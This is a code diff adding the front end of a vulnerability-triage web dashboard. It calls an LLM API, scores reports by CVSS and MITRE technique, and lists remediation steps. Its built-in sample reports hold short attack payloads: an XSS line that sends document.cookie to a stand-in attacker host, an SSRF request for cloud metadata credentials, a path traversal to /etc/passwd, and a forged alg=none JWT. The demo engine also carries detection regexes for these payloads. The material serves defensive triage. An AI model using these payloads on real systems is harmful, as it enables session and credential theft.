+  if(!key) throw new Error("NEBIUS_API_KEY not set — paste a key in the header field.");
+  if(!key.startsWith("v1.")) throw new Error("Token Factory key must start with 'v1.'");
+  let res;
+  try{
+    res=await fetch(NEBIUS_BASE_URL+"/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},
+      body:JSON.stringify({model,temperature:0.0,messages:[{role:"system",content:SYSTEM_PROMPT},{role:"user",content:USER_TEMPLATE.replace("{report}",report)}]})});
+  }catch(e){ const err=new Error("Browser request blocked (likely CORS). Run `python src/agent.py` for live calls, or serve this page via a small proxy."); err.cors=true; throw err; }
+  if(!res.ok) throw new Error("HTTP "+res.status+": "+(await res.text()).slice(0,200));
+  const data=await res.json(); let raw=data.choices[0].message.content.trim();
+  if(raw.startsWith("```")){raw=raw.split("\n").slice(1).join("\n"); if(raw.endsWith("```")) raw=raw.slice(0,-3);}
+  return JSON.parse(raw);
+}
+
+// ---------- Output ----------
+function hl(json){return esc(json).replace(/(&quot;[^&]*?&quot;)(\s*:)?|\b(-?\d+\.?\d*)\b/g,(m,s,colon,n)=>s?(colon?`<span class="jk">${s}</span>${colon}`:`<span class="js">${s}</span>`):`<span class="jn">${n}</span>`);}
+function renderOut(r,banner,valid,verr){
+  const col=SEV[r.severity]||"#7d8aa5",C=2*Math.PI*50,frac=Math.max(0,Math.min(1,(+r.cvss_score||0)/10)),pr=+r.priority,json=JSON.stringify(r,null,2);
+  $("schemaPill").innerHTML=valid?'<span class="pill ok">✓ schema valid</span>':'<span class="pill no">✕ schema invalid</span>';
+  $("out").innerHTML=`${banner}${valid?"":`<div class="banner err">_validate(): ${esc(verr)}</div>`}
+  <div class="oh"><div class="gauge"><svg width="120" height="120"><circle cx="60" cy="60" r="50" stroke="#16203a" stroke-width="9" fill="none"/><circle id="cv" cx="60" cy="60" r="50" stroke="${col}" stroke-width="9" fill="none" stroke-linecap="round" stroke-dasharray="${C}" stroke-dashoffset="${C}" style="transition:stroke-dashoffset 1s cubic-bezier(.2,.8,.2,1);filter:drop-shadow(0 0 6px ${col})"/></svg><div class="c"><div><b id="cvn" style="color:${col}">0.0</b><small>CVSS</small></div></div></div>
+  <div><span class="sev" style="background:${col}1f;color:${col};border:1px solid ${col}66">${esc(r.severity)}</span><br><span class="chip">MITRE ATT&amp;CK · ${esc(r.attack_technique)}</span><p class="summary">${esc(r.summary)}</p></div></div>
+  <div class="sect"><h3>Remediation plan</h3><ul class="steps">${(Array.isArray(r.remediation_steps)?r.remediation_steps:[]).map((s,i)=>`<li style="animation-delay:${.06*i}s" tabindex="0"><span class="bx"></span><span>${esc(s)}</span></li>`).join("")}</ul></div>
+  <div class="sect"><h3>Affected assets</h3>${(r.affected_assets||[]).map(a=>`<span class="chip w">${esc(a)}</span>`).join("")}</div>
+  <div class="sect meta"><div><h3 style="margin:0 0 6px;font:600 10px var(--sans);letter-spacing:.14em;color:var(--dim)">EFFORT</h3><div class="scale">${["S","M","L"].map(e=>`<i class="${e===r.estimated_effort?"on":""}">${e}</i>`).join("")}</div></div>
+  <div><h3 style="margin:0 0 6px;font:600 10px var(--sans);letter-spacing:.14em;color:var(--dim)">PRIORITY (1 = URGENT)</h3><div class="scale">${[1,2,3,4,5].map(p=>`<i class="${p===pr?"on":""}">${p}</i>`).join("")}</div></div></div>
+  <div class="sect"><h3 style="display:flex;align-items:center">Raw JSON<button class="sbtn" id="copy" style="margin-left:auto">Copy</button></h3><pre>${hl(json)}</pre></div>`;
+  setTimeout(()=>$("cv").style.strokeDashoffset=C*(1-frac),30);
+  let t0=null;const target=+r.cvss_score||0;
+  requestAnimationFrame(function tick(t){if(t0===null)t0=t;const k=(location.hash==="#demo"||REDUCE)?1:Math.max(0,Math.min(1,(t-t0)/1000));const cvn=$("cvn");if(!cvn)return;cvn.textContent=(target*(1-Math.pow(1-k,3))).toFixed(1);if(k<1)requestAnimationFrame(tick);});
+  document.querySelectorAll(".steps li").forEach(li=>{const tg=()=>{li.classList.toggle("ck");li.querySelector(".bx").textContent=li.classList.contains("ck")?"✓":"";};li.onclick=tg;li.onkeydown=e=>{if(e.key===" "||e.key==="Enter"){e.preventDefault();tg();}};});
+  $("copy").onclick=async()=>{try{await navigator.clipboard.writeText(json);$("copy").textContent="Copied ✓";}catch{$("copy").textContent="Copy failed";}setTimeout(()=>$("copy").textContent="Copy",1500);};}
+function renderBlocked(v){$("schemaPill").innerHTML='<span class="pill no">blocked</span>';
+  $("out").innerHTML=`<div class="banner err">⛔ AURA biometric verification failed — triage blocked before any model call.</div><pre>${hl(JSON.stringify({aura_gate:v,triage:null,error:"AURA biometric verification failed"},null,2))}</pre>`;}
+
+// ---------- Holographic stratosphere globe (2D canvas, offline land mask 3°) ----------
+const LAND_B64="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH4P+AAAAAAAAAAAAAAAD9P//ABYAAAYAAAAAAABa8f/+AAAACACwAAAAAAcrMB/+AAAAgH/dBAAAYABy/g/wAAAADf///+Ax////64/gAB/z/f/////I////6weBgDv///////+B///+DAMAAPf//////9cAIP/+DoAACLf/////+BgAgH//j8AACGf/////4DAAAB//7+AAFv///////CAAAAf//wAAB////////AAAAAf//wAAB/9f////8AAAAAf//gAAF38f////5AAAAAf/+AAAHB7////9gAAAAAf/+AAAHCX////8iAAAAAP/8AAAD4A////8MAAAAAH/4AAAH+Z////8QAAAAAB8IAAAP//9///+AAAAAAA8AAAAf//+P//8AAAAAAAYEAAAf//fx//wAAAAAAAcggAAf//Pg8egAAAAAAAHgAAAf//vA4fCAAAAAAAAwAAA///8AYHAAAAAAAAARwAAf//+AYBAAAAAAAAAD8AAP//+AAABAAAAAAAAD/gAEP/8AAIMAAAAAAAAD/gAAH/4AAG4AAAAAAAAH/4AAH/wAACaoAAAAAAAH/+AAD/gAACCHAAAAAAAH//AAD/gAAAwDgAAAAAAD//AAB/wAAAAAAAIAAAAB/+AAD/yAAAAZAAAAAAAA/+AAD/mAAAB/AAAAAAAAf+AAD/EAAAD/gAAAAAAAf8AAB/MAAAP/wAAAAAAA/wAAB+AAAAP/4AAAAAAA/wAAB+AAAAP/4AAAAAAA/gAAA8AAAAH/4AAAAAAA/AAAAgAAAAEDwAAAAAAB+AAAAAAAAAABwCAAAAAB4AAAAAAAAAAAACAAAAAAwAAAAAAAAAAAAEAAAAABwAAAAAAAAAAAAIAAAAABgAAAAAAAAAAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAHwD///AAAAAAAA8AAADD/+/////AAAAAH04AA//////////wAD///9gAP//////////ABj///+gcP//////////AAH////53///////////g////////////////////////////////////////";
+const LAND=(()=>{const b=atob(LAND_B64),pts=[];for(let i=0;i<60;i++)for(let j=0;j<120;j++){const k=i*120+j;if(b.charCodeAt(k>>3)&(128>>(k&7)))pts.push([88.5-3*i,-178.5+3*j]);}return pts;})();
+const D2R=Math.PI/180;state.events=[];
+const HOME=[41.88,-87.63];
+function evLoc(seed){let h=2166136261;for(const ch of seed)h=Math.imul(h^ch.charCodeAt(0),16777619);const p=LAND[(h>>>0)%LAND.length];return [p[0]+((h>>>8)%30)/10-1.5,p[1]+((h>>>16)%30)/10-1.5];}
+const SEED=[["demo-seed",51.5,-0.1,"high"],["demo-seed",35.7,139.7,"medium"],["demo-seed",-23.5,-46.6,"critical"],["demo-seed",1.35,103.8,"low"]];
+let holo,stars=[];const GV={lon:-60,lat:23.4,zoom:1,paused:false,drag:false,last:null,hits:[],sel:null};
+function holoLayout(){holo=hidpi($("holo"));stars=[];for(let i=0;i<160;i++)stars.push([Math.random()*holo.w,Math.random()*holo.h*.75,Math.random()*1.2+.2,Math.random()*6]);}
+function v3(lat,lon){const p=lat*D2R,l=lon*D2R;return [Math.cos(p)*Math.cos(l),Math.cos(p)*Math.sin(l),Math.sin(p)];}
+function drawHolo(t){if(!holo)return;const {c,w,h}=holo;c.clearRect(0,0,w,h);
+  if(GV.last!=null&&!GV.paused&&!GV.drag&&!REDUCE)GV.lon=(GV.lon+(t-GV.last)*.006)%360;GV.last=t;GV.hits=[];
+  const lon0=GV.lon,lat0=GV.lat,cl=Math.cos(lat0*D2R),sl=Math.sin(lat0*D2R);
+  const R=Math.min(h*.40,w*.30)*GV.zoom,cx=w/2,cy=h*.47;GV.cx=cx;GV.cy=cy;GV.R=R;
+  const proj=(x,y,z)=>{const l=Math.atan2(y,x)-lon0*D2R,cp=Math.hypot(x,y);const X=cp*Math.sin(l),Z=cp*Math.cos(l);return {x:cx+R*X,y:cy-R*(cl*z-sl*Z),v:sl*z+cl*Z};};
+  const P=(lat,lon,k=1)=>{const [x,y,z]=v3(lat,lon);return proj(x*k,y*k,z*k);};
+  // stars
+  for(const s of stars){c.fillStyle=`rgba(200,255,250,${.25+.35*Math.abs(Math.sin(t*.001+s[3]))})`;c.fillRect(s[0],s[1],s[2],s[2]);}
+  // curved stratospheric horizon at bottom
+  const HR=w*1.6,hy=h+HR-h*.13;let g=c.createRadialGradient(cx,hy,HR-4,cx,hy,HR+38);g.addColorStop(0,"rgba(47,212,200,.55)");g.addColorStop(.3,"rgba(47,212,200,.18)");g.addColorStop(1,"rgba(47,212,200,0)");
+  c.fillStyle=g;c.beginPath();c.arc(cx,hy,HR+38,0,7);c.fill();c.fillStyle="#02121a";c.beginPath();c.arc(cx,hy,HR,0,7);c.fill();
+  c.strokeStyle="rgba(127,246,234,.6)";c.lineWidth=1;c.beginPath();c.arc(cx,hy,HR,Math.PI*1.2,Math.PI*1.8);c.stroke();
+  // projection cone + base ring
+  const by=h*.93;g=c.createLinearGradient(0,cy+R,0,by);g.addColorStop(0,"rgba(47,212,200,.0)");g.addColorStop(1,"rgba(47,212,200,.22)");
+  c.fillStyle=g;c.beginPath();c.moveTo(cx-R*.75,cy+R*.62);c.lineTo(cx-R*.42,by);c.lineTo(cx+R*.42,by);c.lineTo(cx+R*.75,cy+R*.62);c.fill();
+  for(let i=0;i<3;i++){c.strokeStyle=`rgba(127,246,234,${.55-i*.15})`;c.beginPath();c.ellipse(cx,by,R*(.42+i*.09),R*(.07+i*.015),0,0,7);c.stroke();}
+  // globe body + limb glow
+  g=c.createRadialGradient(cx,cy,R*.9,cx,cy,R*1.18);g.addColorStop(0,"rgba(47,212,200,.45)");g.addColorStop(.25,"rgba(47,212,200,.15)");g.addColorStop(1,"rgba(47,212,200,0)");c.fillStyle=g;c.beginPath();c.arc(cx,cy,R*1.18,0,7);c.fill();
+  g=c.createRadialGradient(cx-R*.3,cy-R*.35,R*.1,cx,cy,R);g.addColorStop(0,"rgba(30,90,110,.55)");g.addColorStop(1,"rgba(3,20,30,.85)");c.fillStyle=g;c.beginPath();c.arc(cx,cy,R,0,7);c.fill();
+  c.strokeStyle="rgba(127,246,234,.85)";c.lineWidth=1.4;c.beginPath();c.arc(cx,cy,R,0,7);c.stroke();
+  // graticule
+  c.lineWidth=.6;c.strokeStyle="rgba(127,246,234,.22)";
+  for(let lat=-60;lat<=60;lat+=30){c.beginPath();let on=false;for(let lon=-180;lon<=180;lon+=4){const p=P(lat,lon);if(p.v>0){on?c.lineTo(p.x,p.y):c.moveTo(p.x,p.y);on=true;}else on=false;}c.stroke();}
+  for(let lon=-180;lon<180;lon+=30){c.beginPath();let on=false;for(let lat=-88;lat<=88;lat+=4){const p=P(lat,lon);if(p.v>0){on?c.lineTo(p.x,p.y):c.moveTo(p.x,p.y);on=true;}else on=false;}c.stroke();}
+  // land dot matrix with chromatic aberration
+  const ds=Math.max(1.4,R/95);
+  for(const [col,dx] of [["255,70,120",-1.2],["80,200,255",1.2],["127,246,234",0]]){for(const [la,lo] of LAND){const p=P(la,lo);if(p.v<=0)continue;c.fillStyle=`rgba(${col},${(dx?.18:.35+.6*p.v)})`;c.fillRect(p.x+dx-ds/2,p.y-ds/2,ds,ds);}}
+  // events
+  const home=P(...HOME);const evs=SEED.map(s=>({lat:s[1],lon:s[2],sev:s[3],label:s[0]})).concat(state.events.map(e=>({lat:e.lat,lon:e.lon,sev:e.severity,label:e.demo?"demo":"live",blocked:e.blocked,ref:e})));
+  const SC={critical:"255,77,94",high:"255,138,31",medium:"255,201,61",low:"47,212,200"};
+  evs.forEach((e,i)=>{const a=v3(...HOME),b=v3(e.lat,e.lon),col=SC[e.sev]||"127,246,234";
+    c.strokeStyle=`rgba(${col},.75)`;c.lineWidth=1.2;c.beginPath();let on=false;
+    for(let k=0;k<=40;k++){const u=k/40,x=a[0]*(1-u)+b[0]*u,y=a[1]*(1-u)+b[1]*u,z=a[2]*(1-u)+b[2]*u,n=Math.hypot(x,y,z),lift=1+.18*Math.sin(Math.PI*u);const p=proj(x/n*lift,y/n*lift,z/n*lift);if(p.v>-.05||lift*p.v>0&&Math.hypot(p.x-cx,p.y-cy)>R){on?c.lineTo(p.x,p.y):c.moveTo(p.x,p.y);on=true;}else on=false;}
+    c.stroke();const p=P(e.lat,e.lon);if(p.v<=0)return;GV.hits.push({x:p.x,y:p.y,e});const sel=GV.sel&&e.ref&&GV.sel===e.ref;if(sel){c.strokeStyle="#fff";c.lineWidth=1.5;c.beginPath();c.arc(p.x,p.y,9,0,7);c.stroke();c.lineWidth=1.2;}const ph=REDUCE?.5:((t*.0012+i*.3)%1);
+    c.strokeStyle=`rgba(${col},${1-ph})`;c.beginPath();c.arc(p.x,p.y,3+ph*14,0,7);c.stroke();c.fillStyle=`rgb(${col})`;c.beginPath();c.arc(p.x,p.y,2.6,0,7);c.fill();
+    c.font="9.5px "+getComputedStyle(document.body).getPropertyValue("--mono");c.fillStyle=`rgba(${col},.95)`;c.fillText((e.blocked?"blocked · ":"")+e.label,p.x+7,p.y-6);});
+  if(home.v>0){c.fillStyle="#d9fffb";c.beginPath();c.arc(home.x,home.y,3,0,7);c.fill();c.fillText("SOC",home.x+6,home.y+12);}
+  // rotating reticle
+  const ra=REDUCE?0:t*.0006;c.strokeStyle="rgba(127,246,234,.7)";c.lineWidth=1;
+  for(let i=0;i<4;i++){c.beginPath();c.arc(cx,cy,R*1.08,ra+i*Math.PI/2,ra+i*Math.PI/2+.9);c.stroke();}
+  c.setLineDash([2,6]);c.beginPath();c.arc(cx,cy,R*1.14,-ra,-ra+Math.PI*1.4);c.stroke();c.setLineDash([]);
+  for(let i=0;i<72;i++){const a=i*5*D2R-ra*.5,l=i%6?4:9;c.beginPath();c.moveTo(cx+Math.cos(a)*R*1.2,cy+Math.sin(a)*R*1.2);c.lineTo(cx+Math.cos(a)*(R*1.2+l),cy+Math.sin(a)*(R*1.2+l));c.stroke();}
+  c.beginPath();c.moveTo(cx-10,cy);c.lineTo(cx+10,cy);c.moveTo(cx,cy-10);c.lineTo(cx,cy+10);c.stroke();
+  const lo=((lon0+540)%360)-180;$("hudLL").innerHTML=`LAT <b>${Math.abs(lat0).toFixed(2)}°${lat0<0?"S":"N"}</b> · LON <b>${Math.abs(lo).toFixed(2)}°${lo<0?"W":"E"}</b><br>SUBPOINT TRACK · ${REDUCE||GV.paused?"PAUSED":"ROTATING"} · ZOOM ${GV.zoom.toFixed(1)}×`;
+  $("hudEv").innerHTML=`EVENTS <b>${evs.length}</b> · ${SEED.length} demo-seed · ${state.events.length} session`;}
+
+// ---------- Ribbon chart ----------
+let rib;function ribLayout(){rib=hidpi($("ribbon"));}
+function drawRibbon(t){if(!rib)return;const {c,w,h}=rib;c.clearRect(0,0,w,h);const pl=28,pb=18,ch=h-pb-10,cw=w-pl-8;
+  c.font="10px "+getComputedStyle(document.body).getPropertyValue("--mono");c.fillStyle="#5d6b85";c.strokeStyle="rgba(120,140,180,.12)";
+  for(let i=0;i<=4;i++){const y=10+ch*i/4;c.beginPath();c.moveTo(pl,y);c.lineTo(w-8,y);c.stroke();c.fillText((1-i/4).toFixed(2),0,y+3);}
+  const H=hist.length?hist:[{fused:0,glint:0,lip:0}];const n=Math.max(H.length,2);
+  const ser=[["fused","47,212,200"],["glint","125,211,252"],["lip","45,140,190"]];
+  ser.forEach(([k,col],si)=>{for(let r=0;r<7;r++){c.strokeStyle=`rgba(${col},${.55-r*.07})`;c.lineWidth=r?1:2;c.beginPath();
+    for(let x=0;x<=cw;x+=4){const f=x/cw*(n-1),i=Math.min(H.length-1,Math.floor(f)),j=Math.min(H.length-1,i+1),u=f-Math.floor(f);
+      let v=H[i][k]*(1-u)+H[j][k]*u;v+=Math.sin(x*.02+r*.5+si*2+(REDUCE?0:t*.0008))*.03*(r+1)*.5;const y=10+ch*(1-Math.max(0,Math.min(1,v)));x?c.lineTo(pl+x,y):c.moveTo(pl+x,y);}c.stroke();}});
+  c.fillStyle="#8b98b3";ser.forEach(([k,col],i)=>{c.fillStyle=`rgb(${col})`;c.fillRect(pl+8+i*80,h-10,8,3);c.fillStyle="#8b98b3";c.fillText(k,pl+20+i*80,h-6);});}
+
+// ---------- KPIs + activity ----------
+function renderKpis(){const R=state.runs,E=state.events,avg=R.length?(R.reduce((a,r)=>a+r.cvss_score,0)/R.length).toFixed(1):"—",crit=R.filter(r=>r.severity==="critical").length;
+  const gated=E.filter(e=>e.aura!==null),pr=gated.length?Math.round(100*gated.filter(e=>!e.blocked).length/gated.length)+"%":"—",sv=R.length?R.filter(r=>r.valid).length+"/"+R.length:"—";
+  $("kpis").innerHTML=[["Triage runs",E.length,""],["Critical",crit,crit?"hot":""],["Avg CVSS",avg,""],["AURA pass rate",pr,""],["Tier",state.tier,""],["Schema-valid",sv,R.length&&R.some(r=>!r.valid)?"red":""]].map(([l,v,c])=>`<div class="kpi ${c}"><b>${esc(String(v))}</b><small>${l}</small></div>`).join("");
+  $("actTbl").innerHTML="<thead><tr><th>Time</th><th>Tier</th><th>Severity</th><th>CVSS</th><th>Technique</th><th>AURA score</th><th>Schema</th><th>Mode</th></tr></thead><tbody>"+
+   (E.length?E.slice().reverse().map(e=>`<tr><td>${e.time}</td><td>${e.tier}</td><td>${e.blocked?'<span class="pill no">blocked</span>':`<span class="sev ${esc(e.severity)}">${esc(e.severity)}</span>`}</td><td>${e.cvss??"—"}</td><td>${esc(e.tech||"—")}</td><td>${e.aura===null?"n/a":e.aura.toFixed(4)}</td><td>${e.blocked?"—":e.valid?'<span class="pill ok">valid</span>':'<span class="pill no">invalid</span>'}</td><td>${e.demo?"demo":"live"}</td></tr>`).join(""):'<tr><td colspan="8" style="color:var(--dim)">No runs yet — press Run triage</td></tr>')+"</tbody>";}
+function logEvent(o){const [lat,lon]=evLoc(o.time+o.tier+state.events.length);state.events.push({...o,lat,lon});renderKpis();}
+
+// ---------- Run ----------
+const stamp=()=>new Date().toLocaleTimeString([], {hour:"2-digit",minute:"2-digit",second:"2-digit"});
+/* run handler: see v3 block */
+
+// ---------- Loop ----------
+function sizeAll(){flowLayout();fireLayout();holoLayout();ribLayout();spark();}
+addEventListener("resize",sizeAll);
+document.fonts&&document.fonts.ready.then(sizeAll);
+sizeAll();renderSession();renderKpis();
+let fc=0;
+function loop(t){if($("v-triage").classList.contains("on")||$("v-visibility").classList.contains("on")){drawFlow(t);if(fc++%2===0)spawnFire();drawFire();drawHolo(t);drawRibbon(t);}requestAnimationFrame(loop);}
+if(REDUCE){drawFlow(0);drawStaticFire();drawHolo(performance.now());drawRibbon(0);setInterval(()=>{drawFlow(performance.now());drawStaticFire();drawHolo(performance.now());drawRibbon(0);},1500);}else requestAnimationFrame(loop);
+// ================= v3 interactive layer =================
+// ---------- Samples (sqli from samples/sqli_report.txt; others built-in, fictional) ----------
+const SAMPLES={
+ "SQL injection · /api/v2/search (samples/sqli_report.txt)":SAMPLE,
+ "Remote code execution · image upload":`Title: Remote Code Execution via ImageMagick delegate in avatar upload
+Endpoint: POST /api/v1/users/avatar
+Component: image-processor service (ImageMagick 7.0.x)
+Auth: Any authenticated user
+PoC: Uploading a crafted .svg with an MVG delegate executes arbitrary shell commands as the www-data user.
+Impact: Command execution on the image-processor host; access to internal network and S3 credentials in env.`,
+ "SSRF · webhook preview":`Title: Server-Side Request Forgery in webhook URL preview
+Endpoint: POST /integrations/webhooks/preview
+Parameter: url
+Auth: Authenticated (any workspace member)
+PoC: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ returns cloud metadata.
+Impact: Theft of instance IAM credentials; internal service enumeration.`,
+ "Stored XSS · support ticket comments":`Title: Stored Cross-Site Scripting (XSS) in support ticket comments
+Endpoint: POST /tickets/{id}/comments
+Field: body (rendered as HTML in agent console)
+Auth: Any customer account
+PoC: <img src=x onerror=fetch('//attacker/'+document.cookie)>
+Impact: Session theft of support agents who view the ticket.`,
+ "Path traversal · file download":`Title: Path traversal in report export download
+Endpoint: GET /export/download?file=
+PoC: /export/download?file=../../../../etc/passwd returns the file contents.
+Auth: Authenticated user
+Impact: Arbitrary file read on the reporting server, including config files with DB passwords.`,
+ "Auth bypass · admin API":`Title: Authentication bypass on admin API via missing JWT signature check
+Endpoint: /admin/api/*
+PoC: A JWT with alg=none is accepted; any user can forge role=admin.
+Auth: None required
+Impact: Full administrative control: user management, billing settings, data export.`
+};
+const sel=$("sampleSel");sel.innerHTML='<option value="">Sample reports…</option>'+Object.keys(SAMPLES).map(k=>`<option>${esc(k)}</option>`).join("");
+function loadSample(){const k=sel.value||Object.keys(SAMPLES)[0];$("report").value=SAMPLES[k];updCount();toast("Loaded sample: "+k.split(" · ")[0]);}
+sel.onchange=()=>{if(sel.value)loadSample();};$("loadSample").onclick=loadSample;
+$("clearRep").onclick=()=>{$("report").value="";updCount();$("report").focus();toast("Report cleared");};
+$("report").addEventListener("keydown",e=>{if((e.metaKey||e.ctrlKey)&&e.key==="Enter"){e.preventDefault();$("runBtn").click();}});
+addEventListener("keydown",e=>{if((e.metaKey||e.ctrlKey)&&e.key==="Enter"&&document.activeElement!==$("report")){e.preventDefault();$("runBtn").click();}if(e.key==="Escape")closeDrawer();});
+$("auraOn").addEventListener("change",()=>{$("skipGate").checked=!$("auraOn").checked;renderAura(true);toast("AURA gate "+($("auraOn").checked?"on":"off — triage(aura=None)"));});
+
+// ---------- Toasts ----------
+function toast(msg,kind=""){const d=document.createElement("div");d.className="toast "+kind;d.textContent=msg;$("toasts").appendChild(d);setTimeout(()=>d.remove(),2600);}
+
+// ---------- Demo triage engine (deterministic, keyword-based, SIMULATED) ----------
+const RULES=[
+ {k:"rce",re:/remote code|\brce\b|command (execution|injection)|deserializ|shell command|os\.system|eval\(/i,sev:"critical",cvss:9.8,tech:"T1190 - Exploit Public-Facing Application",eff:"L",pri:1,
+  steps:["Disable or sandbox the vulnerable component/delegate immediately.","Patch the library to a fixed version and pin it.","Run the service as an unprivileged user in an isolated container with no ambient credentials.","Rotate any secrets reachable from the host environment.","Hunt for indicators of prior exploitation in host and egress logs."]},
+ {k:"auth",re:/auth(entication)? bypass|alg=none|missing (jwt|signature)|idor|broken access|privilege escalation/i,sev:"critical",cvss:9.1,tech:"T1078 - Valid Accounts",eff:"M",pri:1,
+  steps:["Enforce signature verification and reject alg=none tokens.","Add server-side authorization checks on every admin route.","Invalidate all active sessions and rotate signing keys.","Add regression tests for forged and tampered tokens.","Review admin audit logs for unauthorized actions."]},
+ {k:"sqli",re:/sql|injection|or 1=1|union select/i,sev:"critical",cvss:9.8,tech:"T1190 - Exploit Public-Facing Application",eff:"M",pri:1,
+  steps:["Replace string-built SQL with parameterized queries / prepared statements.","Validate and allow-list the input parameter; enforce length limits.","Stop reflecting database errors in responses.","Run the service under a least-privilege DB role.","Rotate session tokens and review DB audit logs for prior exploitation.","Add SAST/DAST SQLi checks in CI."]},
+ {k:"ssrf",re:/ssrf|server-side request|169\.254\.169\.254|metadata/i,sev:"high",cvss:8.6,tech:"T1552.005 - Cloud Instance Metadata API",eff:"M",pri:2,
+  steps:["Allow-list outbound destinations and block link-local / private ranges.","Enforce IMDSv2 (session tokens) on all instances.","Route preview fetches through an egress proxy without cloud credentials.","Rotate instance IAM credentials that may have been exposed."]},
+ {k:"traversal",re:/path traversal|directory traversal|\.\.\/|etc\/passwd|lfi/i,sev:"high",cvss:7.5,tech:"T1083 - File and Directory Discovery",eff:"S",pri:2,
+  steps:["Resolve and canonicalize paths; reject anything outside the export directory.","Serve downloads by opaque ID instead of file name.","Move secrets out of readable config files and rotate DB passwords."]},
+ {k:"xss",re:/xss|cross-site scripting|<script|onerror=/i,sev:"medium",cvss:6.1,tech:"T1059.007 - JavaScript",eff:"S",pri:3,
+  steps:["Context-aware output encoding for the rendered field.","Sanitize stored HTML with an allow-list sanitizer.","Add a strict Content-Security-Policy and HttpOnly session cookies."]},
+ {k:"csrf",re:/csrf|cross-site request/i,sev:"medium",cvss:5.4,tech:"T1185 - Browser Session Hijacking",eff:"S",pri:3,steps:["Add anti-CSRF tokens.","Set SameSite=Lax/Strict on session cookies."]},
+ {k:"info",re:/version disclosure|banner|verbose error|stack trace|information disclosure/i,sev:"low",cvss:3.7,tech:"T1592 - Gather Victim Host Information",eff:"S",pri:4,steps:["Suppress version banners and verbose errors in production."]},
+];
+function demoResult(report){
+  const t=report||"",r=RULES.find(x=>x.re.test(t));
+  const title=(t.match(/^\s*title:\s*(.+)$/im)||[])[1];
+  const assets=[...new Set([...(t.match(/(?:GET|POST|PUT|DELETE|PATCH)?\s*(\/[A-Za-z0-9_\-\/{}.*]+)/g)||[]).map(x=>x.trim().replace(/^(GET|POST|PUT|DELETE|PATCH)\s+/,"")).filter(x=>x.length>2&&!x.startsWith("//")).slice(0,3),
+    ...((t.match(/(?:Database|Component):\s*([^\n]+)/i)||[])[1]?[(t.match(/(?:Database|Component):\s*([^\n]+)/i))[1].trim()]:[])])];
+  const unauth=/auth:\s*none|unauthenticated/i.test(t);
+  if(!r) return {severity:t.trim()?"informational":"informational",cvss_score:t.trim()?2.0:0.0,attack_technique:"T1595 - Active Scanning",
+    summary:"Demo heuristic could not match a known vulnerability class"+(title?` in "${title}"`:"")+"; manual review recommended.",
+    remediation_steps:["Reproduce and confirm the issue.","Add details: endpoint, parameter, PoC and impact."],affected_assets:assets.length?assets:["unspecified"],estimated_effort:"S",priority:5};
+  let cv=r.cvss;if(!unauth&&cv>=9&&r.k!=="auth")cv=Math.round((cv-0.9)*10)/10; // authenticated → lower PR
+  const sev=cv>=9?"critical":cv>=7?"high":cv>=4?"medium":cv>0?"low":"informational";
+  return {severity:sev,cvss_score:cv,attack_technique:r.tech,
+    summary:(title||"Reported issue")+` — classified by the demo keyword engine as ${r.k.toUpperCase()}${unauth?" (no authentication required)":""}.`,
+    remediation_steps:r.steps.slice(),affected_assets:assets.length?assets:["unspecified"],estimated_effort:r.eff,priority:sev==="critical"?1:r.pri};
+}
+
+// ---------- Run ----------
+$("runBtn").onclick=async()=>{const btn=$("runBtn");if(btn.disabled)return;
+  const report=$("report").value;if(!report.trim()){toast("Paste a report or pick a sample first","warn");$("report").focus();return;}
+  btn.disabled=true;btn.textContent="Running…";
+  const tier=state.tier,model=MODEL_ROUTING[tier]||MODEL_ROUTING.ultra;
+  state.phase="run";state.t0=performance.now();$("flowTs").textContent="running · "+tier;
+  const fast=new URLSearchParams(location.search).has("selftest");const W=ms=>sleep(fast?Math.min(ms,60):ms);
+  try{await W(700);
+    const v=renderAura(false);state.lastGate=v?v.aura_passed:null;
+    if(v&&!v.aura_passed){state.phase="fail";state.failedAt=1;state.blocked++;
+      const res={aura_gate:v,triage:null,error:"AURA biometric verification failed"};
+      logEvent({time:stamp(),tier,severity:"blocked",cvss:null,tech:null,aura:v.fused_score,blocked:true,demo:!state.live,valid:false,result:res,report});
+      $("flowTs").textContent="blocked at AURA gate · "+stamp();renderBlocked(v);renderSession();toast("Blocked at AURA gate · fused "+v.fused_score.toFixed(3)+" < 0.85","err");return;}
+    let r,banner,demo=true;
+    if(state.live){try{r=await liveCall(report,model);demo=false;banner=`<div class="banner live">● Live — ${esc(model)} via Nebius Token Factory</div>`;}
+      catch(e){r=demoResult(report);toast(e.cors?"Live call blocked by browser CORS — showing demo output":"Live call failed — showing demo output","warn");banner=`<div class="banner err">Live call failed: ${esc(e.message)} Showing demo output instead.</div><div class="banner demo">Demo output — not a live model call</div>`;}}
+    else{await W(900);r=demoResult(report);banner=`<div class="banner demo">◆ Demo output (simulated keyword engine) — not a live model call · <b>${tier}</b> → ${esc(model)}</div>`;}
+    let valid=true,verr="";try{validate(r);}catch(e){valid=false;verr=e.message;}
+    if(v)r.aura_gate=v;
+    await W(Math.max(0,2600-(performance.now()-state.t0)));
+    state.phase=valid?"done":"fail";state.failedAt=3;state.last=r;
+    state.runs.push({...r,cvss_score:+r.cvss_score||0,tier,demo,valid});
+    logEvent({time:stamp(),tier,severity:r.severity,cvss:(+r.cvss_score||0).toFixed(1),tech:r.attack_technique,aura:v?v.fused_score:null,blocked:false,demo,valid,result:r,report});
+    $("flowTs").textContent=(valid?"completed":"validation failed")+" · "+stamp()+(demo?" · demo":"");$("outTs").textContent=stamp()+(demo?" · demo":" · live");
+    renderOut(r,banner,valid,verr);renderSession();toast(`${valid?"✓":"✕"} ${r.severity} · CVSS ${r.cvss_score} · ${tier}${demo?" · demo":""}`,valid?"ok":"err");
+  }finally{btn.disabled=false;btn.textContent="▶ Run triage";save();}};
+
+// ---------- Events, persistence ----------
+var EVID=0;
+function logEvent(o){const [lat,lon]=evLoc(o.time+o.tier+state.events.length);state.events.push({...o,id:++EVID,ts:Date.now(),lat,lon});renderKpis();}
+const LSK="vulntriage.session.v3";
+function save(){try{if($("sPersist").checked)localStorage.setItem(LSK,JSON.stringify({runs:state.runs,events:state.events,blocked:state.blocked}));else localStorage.removeItem(LSK);}catch{}}
